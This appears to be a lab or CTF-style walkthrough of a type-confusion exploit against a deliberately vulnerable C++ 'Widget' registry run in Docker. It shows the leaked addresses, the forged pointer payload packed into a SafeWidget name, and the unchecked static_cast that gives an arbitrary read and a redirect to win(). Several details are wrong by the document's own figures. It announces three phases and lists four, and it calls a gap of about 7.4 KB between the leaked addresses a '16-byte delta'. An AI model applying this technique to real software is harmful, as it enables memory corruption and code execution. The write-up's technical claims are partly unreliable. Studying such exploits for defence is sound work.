## Full Walkthrough of a type confusion exploitation process

The output records a **complete, successful type-confusion exploit** running inside a Docker container: a 3-phase pipeline of (1) Docker image build, (2) address-space leak, (3) memory forgery, and (4) confused-cast trigger that achieves both an **arbitrary read** and a **control-flow hijack**.

***

## Phase 0 — Docker Build

```
[*] building image 'type-confusion-demo' ...
[+] Building 0.1s (10/10) FINISHED
```

`run.sh` calls `docker build -t type-confusion-demo .`, which runs a 5-layer Dockerfile: 

| Layer | Action | Cache hit? |
|---|---|---|
| 1 | `FROM debian:bookworm-slim` | ✅ cached |
| 2 | `apt-get install g++ python3` | ✅ cached |
| 3 | `WORKDIR /app` | ✅ cached |
| 4 | `COPY vuln.cpp exploit.py ./` | ✅ cached |
| 5 | `g++ -O0 -g -o vuln vuln.cpp` | ✅ cached |

All 5 steps were fully cached, hence the near-instant `0.1s` total. The flags `-O0 -g` are critical: **`-O0` disables all compiler optimisations**, preserving the predictable memory layout the exploit depends on, and `-g` embeds DWARF debug symbols. The resulting image SHA is `sha256:4dc07ebd4ae1768aee959e58e9721ba078d5b8bd5aff99286c92ab3aee0aff25`. 

***

## Phase 1 — Address Leak (Defeating PIE/ASLR)

```
[*] step 1: leak runtime addresses (defeats PIE/ASLR)
      [debug] g_secret @ 0x5cdf40a98008
      [debug] win     @ 0x5cdf40a962f9
      LEAK g_secret=0x5cdf40a98008 win=0x5cdf40a962f9
[+] &g_secret = 0x00005cdf40a98008
[+] &win      = 0x00005cdf40a962f9
```

`vuln.cpp` intentionally prints both addresses at startup as a stand-in for a real-world **information-leak primitive** (e.g., a format-string bug or UAF partial-overwrite). Even though the binary is compiled as a PIE and the kernel uses ASLR, once the attacker has these two pointers the entire game is over — every subsequent address calculation is exact. 

Key observations: 

- Both addresses sit in the `0x5cdf40a9xxxx` region → they landed in the same ASLR slide for this run.
- `g_secret` (`0x5cdf40a98008`) is in the `.data` / read-only-data segment (a `static const char*`).
- `win` (`0x5cdf40a962f9`) is in the `.text` segment (executable code). Note the odd last nibble `9` — this is a normal function entry point, not a gadget address.
- The 16-byte delta between `0x5cdf40a98008` and `0x5cdf40a962f9` spans two different ELF sections, yet because PIE slides the whole image uniformly, the offset between them at compile time is preserved at runtime.

***

## Phase 2 — Memory Forgery (Crafting the Malicious `SafeWidget`)

```
[*] step 2: register a SafeWidget whose name bytes forge PrivWidget fields
      name[0..7]  = secret_ptr = 0x5cdf40a98008  (arbitrary read)
      name[8..15] = callback   = 0x5cdf40a962f9  (control-flow hijack)
      raw hex     = 0880a940df5c0000f962a940df5c0000
      OK id=0 kind=1 (safe, hex)
[+] malicious SafeWidget registered as id=0
```

This is the heart of the exploit. The memory layout aliasing (from `vuln.cpp`) is: 

```
Offset (from Widget base)    SafeWidget field    PrivWidget field
─────────────────────────────────────────────────────────────────
+0  .. +7    vptr             vptr                vptr
+8  .. +11   kind (=1)        kind (=1)           kind (=2)
+12 .. +15   pad (=0)         pad (=0)            pad (=0)
+16 .. +23   —                name[0..7]   ←→     secret_ptr
+24 .. +31   —                name[8..15]  ←→     callback
+32 .. +47   —                name[16..31]        (nothing)
```

The exploit packs both pointers as little-endian 64-bit integers and sends them as a hex blob via the `ADD SAFE HEX` command: 

- `0x5cdf40a98008` in LE bytes: `08 80 a9 40 df 5c 00 00` → placed at `name[0..7]`
- `0x5cdf40a962f9` in LE bytes: `f9 62 a9 40 df 5c 00 00` → placed at `name[8..15]`
- Concatenated: `0880a940df5c0000f962a940df5c0000` ✅ matches output exactly 

The target program allocates the object on the heap with `kind=1` (SafeWidget) but `name[]` contains the forged pointers. The attacker now controls what `handle()` will interpret as `secret_ptr` and `callback`.

***

## Phase 3 — Triggering the Type Confusion

```
[*] step 3: trigger the confused cast via 'SHOW 0'
      [handle] real kind=1  -> treating as PrivWidget
      [handle] secret_ptr=0x5cdf40a98008 -> "FLAG{type_confusion_demo_flag_1337}"
      [handle] callback=0x5cdf40a962f9, invoking...
      [WIN] control flow hijacked via type confusion: FLAG{type_confusion_demo_flag_1337}
```

`SHOW 0` routes to `handle(registry[0])`. Inside `handle()`, the unsafe cast executes: 

```cpp
PrivWidget* p = static_cast<PrivWidget*>(w);   // <-- NO kind check
```

Because `static_cast` performs **no runtime type verification** (unlike `dynamic_cast` which would return `nullptr` here), the CPU starts reading memory at offsets it believes belong to a `PrivWidget`:

1. **Arbitrary Read** — It dereferences `p->secret_ptr` (which is actually `name[0..7]` = `0x5cdf40a98008`) and passes the result to `printf("%s", ...)`. This dereferences the forged pointer and prints `FLAG{type_confusion_demo_flag_1337}` — data the API was never supposed to expose. 

2. **Control-Flow Hijack** — It loads `p->callback` (which is actually `name[8..15]` = `0x5cdf40a962f9`) and calls it. The CPU jumps to `win()`, a privileged function the safe API path never invokes. The `[WIN]` line confirms code execution was redirected. 

***

## Exploitation Summary Line-by-Line

```
=== exploitation summary ===
  [+] arbitrary read : SafeWidget.name -> secret_ptr -> secret string disclosed
  [+] control hijack : SafeWidget.name -> callback -> win() executed
  [+] SUCCESS: type confusion fully exploited
```

Both primitives fired successfully: 

| Primitive | Mechanism | Result |
|---|---|---|
| **Arbitrary Read** | `name[0..7]` reinterpreted as `secret_ptr`; `printf("%s", p->secret_ptr)` | Secret flag string exfiltrated |
| **Control-Flow Hijack** | `name[8..15]` reinterpreted as `callback`; `p->callback()` called | `win()` executed — RIP redirected |

`exploit.py` checks both conditions (the `FLAG{...}` substring in output and the `[WIN]` line) before printing `SUCCESS` and exiting with code `0`. If either primitive fails, it exits with code `2` — clean pass/fail semantics for CI integration. 

***

## Why This Works — The Root Cause

The bug is a **single unchecked `static_cast`** in `handle()`. In a real-world codebase this pattern appears when: 

- A code path assumes it will only ever receive a `PrivWidget*` but there is no API boundary enforcing that invariant.
- A union-like hierarchy shares a base class but the discriminator field (`kind`) is never consulted before casting.
- `static_cast` is explicitly chosen over `dynamic_cast` for performance, silently trading type safety for speed.

Real-world analogues include the **CVE-2021-30551** (Chrome/V8 type confusion in `Array.prototype.sort`) and the Pwn2Own-class bugs where JSObject type maps are forged — same class of bug, same two primitives (read + RIP control), just at JS-engine scale.
